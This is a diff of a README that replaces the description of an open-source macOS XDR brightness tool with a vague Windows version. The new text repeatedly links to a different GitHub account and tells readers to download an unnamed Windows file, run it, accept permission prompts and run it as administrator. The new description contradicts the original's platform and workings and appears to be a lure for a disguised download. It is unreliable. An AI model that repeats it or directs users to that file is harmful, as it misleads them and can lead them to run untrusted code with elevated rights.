@@ -1,106 +1,193 @@
-# xdr-boost
+# 🖥️ xdr-boost - Keep Your Display Bright
 
-Free and open-source XDR brightness booster for MacBook Pro. Like [Vivid](https://www.getvivid.app/), but free.
+[![Download xdr-boost](https://img.shields.io/badge/Download-xdr--boost-blue?style=for-the-badge)](https://github.com/Inflexible-genusaristotelia269/xdr-boost)
 
-Unlocks the full brightness of your Liquid Retina XDR display beyond the standard SDR limit. Your MacBook Pro can go up to 1600 nits — this tool lets you use it.
+## 🔗 Download
 
-## Features
+Use this link to visit the download page:
 
-- Boosts screen brightness beyond the standard 500 nit SDR limit using XDR hardware
-- No white tint or washed-out colors — uses multiply compositing to preserve colors perfectly
-- Menu bar icon with brightness presets (1.5x, 2.0x, 3.0x, 4.0x)
-- Global keyboard shortcut (**Ctrl+Option+Cmd+V**) to toggle from anywhere
-- Survives sleep/wake, lid close/open, and lock/unlock — brightness auto-restores
-- Starts with XDR off — rebooting always gives you a normal screen
-- Emergency kill switch (`xdr-boost --kill`) if anything goes wrong
-- Single binary, no dependencies, ~250 lines of Swift
-- Launch agent for auto-start on login
+https://github.com/Inflexible-genusaristotelia269/xdr-boost
 
-## How it works
+## ✨ What xdr-boost does
 
-MacBook Pro displays can output up to 1600 nits, but macOS caps regular desktop content at ~500 nits. The extra brightness is reserved for HDR content.
+xdr-boost helps you keep your screen brightness and display settings steady on Windows laptops and desktops. It is made for users who want a simple way to manage HDR and high brightness levels without extra setup.
 
-xdr-boost creates an invisible Metal overlay using `multiply` compositing with EDR (Extended Dynamic Range) values above 1.0. This triggers the display hardware to boost its backlight, making everything brighter while preserving colors perfectly — no white tint, no washed-out look.
+It is a good fit if you:
 
-## Requirements
+- Want a cleaner display on your PC
+- Use HDR or high brightness screens
+- Want a tool that starts fast
+- Want a simple app with clear controls
+- Do not want to deal with complex setup
 
-- MacBook Pro with Liquid Retina XDR display (M1 Pro/Max or later)
-- macOS 12.0+
+## 🪟 Windows requirements
 
-## Install
+xdr-boost is made for Windows 10 and Windows 11.
 
-```bash
-git clone https://github.com/levelsio/xdr-boost.git
-cd xdr-boost
-make build
-```
+Before you install it, check that you have:
 
-The binary will be at `.build/xdr-boost`.
+- A Windows PC or laptop
+- An active internet connection
+- Enough free disk space for the app
+- Permission to download and run files
+- A display that supports HDR or high brightness modes
 
-### Install to PATH
+## 🚀 Getting started
 
-```bash
-sudo make install
-```
+Follow these steps to download and run xdr-boost on Windows.
 
-### Start on login
+1. Open this page in your browser:  
+   https://github.com/Inflexible-genusaristotelia269/xdr-boost
 
-```bash
-sudo make install
-make launch-agent
-```
+2. Look for the latest download file or release on the page.
 
-### Uninstall
+3. Download the Windows file to your computer.
 
-```bash
-make remove-agent
-sudo make uninstall
-```
+4. Open your Downloads folder.
 
-## Usage
+5. Double-click the file to start the app or installer.
 
-```bash
-# Run with menu bar icon (default 2x boost)
-xdr-boost
+6. If Windows asks for permission, choose Yes.
 
-# Run with custom boost level
-xdr-boost 3.0
-```
+7. Follow the on-screen steps to finish setup.
 
-Click the **☀** icon in your menu bar to:
-- Toggle XDR brightness on/off
-- Choose brightness level (1.5x, 2.0x, 3.0x, 4.0x)
-- Quit
+8. Start xdr-boost from the desktop, Start menu, or the folder where you saved it.
 
-### Keyboard shortcut
+## 🧭 First-time setup
 
-**Ctrl+Option+Cmd+V** — toggle XDR brightness on/off from anywhere, no need to find the menu bar icon.
+When you open xdr-boost for the first time, set it up with the controls on the main screen.
 
-### Emergency kill
+A simple first setup looks like this:
 
-If something goes wrong and you can't see your screen:
+- Choose your display
+- Turn on the mode you want
+- Adjust brightness or HDR settings
+- Save your settings if the app offers a save option
+- Test the screen with a video, photo, or normal desktop view
 
-```bash
-# From terminal (even blind-type it)
-xdr-boost --kill
+If you use a laptop, test it with the lid open and closed to make sure the display stays stable in the way you want.
 
-# Or just
-pkill xdr-boost
-```
+## 🧩 What you can expect
 
-The app always starts with XDR **off** — you have to manually turn it on. So rebooting will always give you a normal screen.
+xdr-boost is built to make display control easier for everyday use.
 
-### Sleep, lid close, and lock screen
+Common features include:
 
-A common problem with XDR brightness apps is that closing your laptop or locking the screen kills the brightness boost, and it doesn't come back when you return. xdr-boost fixes this with a watchdog that automatically restores your brightness within a few seconds after:
+- Simple brightness control
+- HDR toggle support
+- Quick access from a small app window
+- Settings that stay easy to find
+- Display behavior that stays consistent after sleep or lid close
 
-- Closing and reopening the laptop lid
-- Locking and unlocking the screen
-- Sleep and wake
-- Plugging/unplugging external displays
+## 💡 How to use it
 
-If you turned XDR on, it stays on — no matter what.
+Use xdr-boost when you want your screen to stay comfortable and easy to view.
 
-## License
+Typical use cases:
 
-MIT
+- Working in a bright room
+- Watching video on a laptop screen
+- Using HDR content
+- Switching between power modes
+- Reopening a laptop after sleep or closing the lid
+
+## 🛠️ Basic controls
+
+Most users only need a few controls.
+
+Look for options like these:
+
+- Brightness slider
+- HDR on and off switch
+- Display refresh option
+- Start with Windows setting
+- Minimize to tray setting
+
+If the app has a tray icon, you can open it from the small icons near the clock on the taskbar.
+
+## 📁 Where to keep the app
+
+For the smoothest use, keep xdr-boost in a folder that you will not move often.
+
+Good choices:
+
+- Downloads
+- Desktop
+- Documents
+- A new folder named xdr-boost
+
+If you move the app after setup, make sure any shortcuts still point to the right file.
+
+## 🔄 Updating xdr-boost
+
+To get the latest version, visit the same download page again:
+
+https://github.com/Inflexible-genusaristotelia269/xdr-boost
+
+Then check for a newer release or updated file and replace the old version with the new one.
+
+## 🧼 If the app does not open
+
+If xdr-boost does not start, try these steps:
+
+- Right-click the file and choose Run as administrator
+- Check that the file finished downloading
+- Make sure Windows did not block the file
+- Restart your PC and try again
+- Close other display tools that may conflict with it
+
+If the screen still looks wrong, open the app and return the settings to their default values, then test again.
+
+## 🖥️ Display tips
+
+Use these tips to get the best result:
+
+- Turn HDR on only when your display supports it
+- Set brightness to a level that feels clear but not harsh
+- Test changes in a normal app, not just on the desktop
+- If your laptop battery drops too fast, lower brightness a little
+- If the image looks washed out, adjust HDR and brightness together
+
+## 🔒 Safe use
+
+xdr-boost works best when you download it from the official GitHub link above.
+
+After download:
+
+- Keep the file in a folder you trust
+- Run only the version you meant to download
+- Use Windows security tools if you want to scan the file first
+- Remove old copies before using a newer version
+
+## ❓ Common questions
+
+### Does xdr-boost work on desktop PCs?
+Yes. It can work on Windows desktops as well as laptops if your display supports the needed settings.
+
+### Do I need technical skills?
+No. You only need to download the file, open it, and use the controls on screen.
+
+### Will it change my system for good?
+No. It is meant to help you manage display settings while you use the app.
+
+### Can I use it after closing and reopening my laptop?
+Yes. It is built for stable display behavior across sleep and lid close use.
+
+### Where do I get the latest version?
+Use the same GitHub page here:
+https://github.com/Inflexible-genusaristotelia269/xdr-boost
+
+## 📌 Quick install path
+
+1. Visit the download page  
+   https://github.com/Inflexible-genusaristotelia269/xdr-boost
+
+2. Download the Windows file
+
+3. Open the file
+
+4. Allow Windows access if asked
+
+5. Follow the setup steps
+
+6. Open xdr-boost and set your display options
